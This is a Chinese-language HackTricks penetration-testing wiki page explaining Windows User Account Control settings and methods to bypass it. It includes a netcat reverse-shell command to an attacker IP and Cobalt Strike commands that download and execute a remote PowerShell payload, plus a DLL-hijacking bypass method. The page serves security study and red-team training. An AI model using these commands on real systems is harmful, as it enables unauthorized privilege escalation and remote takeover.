# UAC - 用户账户控制

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

- 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
- 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
- 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品
- **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
- 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

使用[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)可以轻松构建和**自动化工作流程**，并由全球**最先进的**社区工具提供支持。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[用户账户控制（UAC）](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)是一项功能，它为**提升的活动启用了一个**同意提示。应用程序具有不同的`完整性`级别，具有**高级别**的程序可以执行可能**危及系统**的任务。启用UAC后，应用程序和任务始终以非管理员帐户的安全上下文下运行，除非管理员明确授权这些应用程序/任务具有管理员级别访问权限以运行系统。这是一个方便的功能，可保护管理员免受意外更改，但不被视为安全边界。

有关完整性级别的更多信息：

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

当UAC生效时，管理员用户会获得2个令牌：一个标准用户密钥，用于以常规级别执行常规操作，另一个带有管理员权限。

这个[页面](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)深入讨论了UAC的工作原理，包括登录过程、用户体验和UAC架构。管理员可以使用安全策略来配置UAC在本地级别的工作方式（使用secpol.msc），或通过Active Directory域环境中的组策略对象（GPO）进行配置和推送。各种设置在[这里](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings)详细讨论。有10个组策略设置可用于UAC。以下表提供了额外的细节：

| 组策略设置                                                                                                                                                                                                                                                                                                                                                           | 注册表键                | 默认设置                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [用户账户控制：内置管理员帐户的管理员批准模式](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Disabled                                                     |
| [用户账户控制：允许UIAccess应用程序在不使用安全桌面的情况下提示提升](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Disabled                                                     |
| [用户账户控制：管理员批准模式中管理员的提升提示行为](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Prompt for consent for non-Windows binaries                  |
| [用户账户控制：标准用户的提升提示行为](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Prompt for credentials on the secure desktop                 |
| [用户账户控制：检测应用程序安装并提示提升](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Enabled (default for home) Disabled (default for enterprise) |
| [用户账户控制：仅提升已签名和验证的可执行文件](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Disabled                                                     |
| [用户账户控制：仅提升已安装在安全位置的UIAccess应用程序](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Enabled                                                      |
| [用户账户控制：以管理员批准模式运行所有管理员](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Enabled                                                      |
| [用户账户控制：在提示提升时切换到安全桌面](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Enabled                                                      |
| [用户账户控制：将文件和注册表写入失败虚拟化到每个用户位置](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Enabled                                                      |

### UAC绕过理论

一些程序如果**用户属于管理员组**，则会**自动提升**。这些二进制文件在其_**清单**_中具有值为_**True**_的_autoElevate_选项。该二进制文件还必须**由Microsoft签名**。

因此，为了**绕过**UAC（从**中等**完整性级别**提升到高级**），一些攻击者使用这种类型的二进制文件来**执行任意代码**，因为它将从**高级别完整性进程**中执行。

您可以使用Sysinternals工具_sigcheck.exe_来**检查**二进制文件的_**清单**_。您可以使用_Process Explorer_或_Sysinternals_的_Process Monitor_来**查看**进程的**完整性级别**。

### 检查UAC

要确认UAC是否已启用，请执行以下操作：
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
如果是**`1`**，则UAC已**激活**；如果是**`0`**或**不存在**，则UAC为**未激活**。

然后，检查已配置的**哪个级别**：
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
* 如果 **`0`**，那么 UAC 不会提示（类似于 **禁用**）
* 如果 **`1`**，管理员会被要求输入用户名和密码以使用高权限执行二进制文件（在安全桌面上）
* 如果 **`2`**（**始终通知我**），当管理员尝试以高权限执行某些内容时，UAC 将始终要求管理员确认（在安全桌面上）
* 如果 **`3`** 类似于 `1` 但不一定在安全桌面上
* 如果 **`4`** 类似于 `2` 但不一定在安全桌面上
* 如果 **`5`**（**默认**），它将要求管理员确认以以高权限运行非 Windows 二进制文件

然后，您需要查看 **`LocalAccountTokenFilterPolicy`** 的值\
如果值为 **`0`**，那么只有 **RID 500** 用户（**内置管理员**）能够在没有 UAC 的情况下执行 **管理员任务**，如果是 `1`，**"管理员"** 组内的所有帐户都可以执行这些任务。

最后，查看 **`FilterAdministratorToken`** 键的值\
如果是 **`0`**（默认），**内置管理员帐户可以**执行远程管理任务，如果是 **`1`**，内置管理员帐户 **不能**执行远程管理任务，除非 `LocalAccountTokenFilterPolicy` 设置为 `1`。

#### 总结

* 如果 `EnableLUA=0` 或 **不存在**，**任何人都没有 UAC**
* 如果 `EnableLua=1` 和 **`LocalAccountTokenFilterPolicy=1`，任何人都没有 UAC**
* 如果 `EnableLua=1` 和 **`LocalAccountTokenFilterPolicy=0` 和 `FilterAdministratorToken=0`，RID 500（内置管理员）没有 UAC**
* 如果 `EnableLua=1` 和 **`LocalAccountTokenFilterPolicy=0` 和 `FilterAdministratorToken=1`，所有人都有 UAC**

所有这些信息可以使用 **metasploit** 模块收集：`post/windows/gather/win_privs`

您还可以检查用户的组并获取完整性级别：
```
net user %username%
whoami /groups | findstr Level
```
## UAC绕过

{% hint style="info" %}
请注意，如果您可以访问受害者的图形界面，则UAC绕过非常简单，因为您可以在UAC提示出现时直接点击“是”。
{% endhint %}

在以下情况下需要UAC绕过：**UAC已激活，您的进程在中间完整性上下文中运行，且您的用户属于管理员组**。

值得一提的是，**如果UAC处于最高安全级别（始终）比处于其他任何级别（默认）更难绕过**。

### UAC已禁用

如果UAC已被禁用（`ConsentPromptBehaviorAdmin`为**`0`**），您可以使用类似以下内容**以管理员权限（高完整性级别）执行反向Shell**：
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### 使用令牌复制绕过UAC

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **非常**基本的UAC“绕过”（完全文件系统访问）

如果您拥有一个属于管理员组的用户的shell，您可以通过SMB（文件系统）本地挂载C$共享到新磁盘，然后您将可以访问文件系统中的所有内容（甚至管理员的主文件夹）。

{% hint style="warning" %}
**看起来这个技巧不再起作用了**
{% endhint %}
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### 使用 Cobalt Strike 绕过 UAC

只有在 UAC 没有设置为最高安全级别时，Cobalt Strike 技术才能生效。
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire**和**Metasploit**也有几个模块可以**绕过**用户账户控制（**UAC**）。

### KRBUACBypass

文档和工具在[https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC绕过利用

[**UACME**](https://github.com/hfiref0x/UACME)是几个UAC绕过利用的**编译**集合。请注意，您需要使用Visual Studio或MSBuild**编译UACME**。编译将创建几个可执行文件（如`Source\Akagi\outout\x64\Debug\Akagi.exe`），您需要知道**您需要哪一个**。\
您应该**小心**，因为有些绕过会**提示一些其他程序**，这些程序会**警告用户**有事情发生。

UACME具有每个技术开始工作的**构建版本**。您可以搜索影响您版本的技术：
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
### 更多UAC绕过

这个[页面](https://en.wikipedia.org/wiki/Windows\_10\_version\_history)可以获取Windows版本`1607`的构建版本。

**所有**在这里用于绕过AUC的技术**都需要**与受害者进行**完全交互的shell（常见的nc.exe shell不够）。

您可以使用**meterpreter**会话。迁移到一个具有**Session**值等于**1**的**进程**：

![](<../../.gitbook/assets/image (96).png>)

（_explorer.exe_应该有效）

### 使用GUI的UAC绕过

如果您可以访问**GUI**，当出现UAC提示时，您可以直接接受它，无需绕过。因此，访问GUI将允许您绕过UAC。

此外，如果您获得了某人正在使用的GUI会话（可能通过RDP），那么有**一些工具将作为管理员运行**，您可以从中直接**以管理员身份运行**例如**cmd**，而无需再次受到UAC的提示，如[**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)。这可能会更加**隐蔽**。

### 嘈杂的暴力UAC绕过

如果您不在乎嘈杂，您可以始终**运行类似于**[**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin)，**要求提升权限，直到用户接受为止**。

### 您自己的绕过 - 基本UAC绕过方法论

如果您查看**UACME**，您会注意到**大多数UAC绕过都滥用了Dll劫持漏洞**（主要是将恶意dll写入_C:\Windows\System32_）。[阅读此内容以了解如何找到Dll劫持漏洞](../windows-local-privilege-escalation/dll-hijacking.md)。

1. 找到一个将**自动提升权限**的二进制文件（检查当执行时它是否以高完整性级别运行）。
2. 使用procmon找到可能对**DLL劫持**有漏洞的“**NAME NOT FOUND**”事件。
3. 您可能需要将DLL写入一些**受保护路径**（如C:\Windows\System32），在这些路径中您没有写入权限。您可以通过以下方式绕过：
1. **wusa.exe**：Windows 7、8和8.1。它允许在受保护路径内提取CAB文件的内容（因为此工具是以高完整性级别执行的）。
2. **IFileOperation**：Windows 10。
4. 准备一个**脚本**，将您的DLL复制到受保护路径内并执行易受攻击且自动提升权限的二进制文件。

### 另一种UAC绕过技术

观察**自动提升权限的二进制文件**是否尝试从**注册表**中**读取**要**执行**的**二进制文件**或**命令**的**名称/路径**（如果二进制文件在**HKCU**中搜索此信息，则更有趣）。

利用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)轻松构建和**自动化工作流**，使用全球**最先进**的社区工具。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
